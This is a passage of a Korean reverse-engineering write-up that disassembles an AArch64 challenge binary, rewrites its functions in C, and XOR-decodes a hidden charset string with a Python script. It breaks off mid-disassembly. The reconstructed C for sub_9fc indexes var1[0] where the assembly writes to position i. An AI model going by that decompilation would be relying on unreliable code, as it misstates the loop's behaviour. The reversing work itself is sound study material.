<span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>                    // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main 함수를 보면 <code>sp + #16</code>에 calloc(0x13,1)을 해주고 <code>sub_ab8</code>함수가 호출된 후 나온 값을 인자로 <code>sub_9b0</code> 함수가 실행된 후 <code>sp + #24</code>에 저장합니다. 그 후 <code>sub_96c</code> 함수를 호출하고 값을 받아서<code>sp+#16</code>에 넣어주고  <code>sub_9b0(sub_ab8())</code> 한 값과 input 값을 인자로 <code>sub_b30</code> 함수를 호출하고 프로그램이 종료됩니다. 해당 함수를 c 코드로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>sub_ab8</code>과 <code>sub_9b0</code> 함수를 살펴봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8                    // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e                   // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64의 calling convention은 <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> 이므로 인자에 value1, 0x3e, value0, 0x8을 넣어 <code>sub_9fc</code>를 호출합니다. 호출하고 난 후 연산된 문자열을 return 해줍니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>                // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>에서 반환한 문자열을 받아서 길이를 계산한 후 <code>malloc</code> 해줍니다. 할당한 주소가 0이라면 0을 반환해주고, 아니면 <code>strcpy</code>를 통해 <code>sub_ab8</code>에서 온 문자열을 복사하여 return 해줍니다.</p><p>이제 <code>sub_9fc</code> 함수를 분석을 해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>인자로 받은 값을 차례대로 스택에 저장합니다. <code>w1</code>과 <code>w3</code>은 데이터의 길이로 추정되므로 <code>x0</code>, <code>x2</code>에 들어온 값을 보면 <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> 이 됩니다. 스택에 값을 저장한 후 첫 번째 인자의 길이+1 만큼 <code>malloc</code>을 해준 후 <code>sp+#56</code>에 저장합니다. 그 후 첫 번째 인자의 길이를 가져와서 <code>malloc</code>한 주소의 마지막 index에 0x0을 넣어주고 <code>sp+#52</code>에 0을 저장해준 후 <code>a9c</code>로 이동합니다.</p><p><code>a9c</code>에서는 0을 <code>w1</code>에 넣고 첫 번째 문자열의 길이를 <code>w0</code>에 불러온 후 두 개를 비교하여 <code>a40</code>으로 이동합니다. <code>w1=w0</code>이 되면 <code>flag</code>가 <code>0</code>으로 세팅되고 <code>b.lt</code> 연산이 수행되지 않으므로 첫 번째 문자열의 길이만큼 반복하는 구간임을 알 수 있습니다. <code>a40</code>에서 <code>[sp+#40 + sp+#52]</code>의 값을 <code>w2</code>에 넣고 <code>w3</code>에는 <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> 연산을 통해 <code>sp+#52 % sp+#32</code> 를 수행한 후 해당 주소의 값을 가져와서 두 문자열을 <code>xor</code> 연산합니다.</p><p><code>sub_9fc</code> 를 c로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>);    var1[param2] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++)    &#123;        var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>;    &#125;    <span class="hljs-keyword">return</span> var1;&#125;</code></pre><p>해당 문자열들이 <code>sub_9fc</code>를 거쳐 어떠한 값이 나오는지 구하는 python 스크립트는 아래와 같습니다.</p><pre><code class="hljs python">string1 = [    <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>,    <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>,    <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>,    <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>,    <span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>,    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)):    result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p><code>sub_9fc</code>까지 마쳤으니 다시 main으로 돌아가죠!</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이제 입력 값을 받아서 <code>sub_b30</code>하는 것만 남았네요. <code>sub_b30</code> 함수를 확인해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span 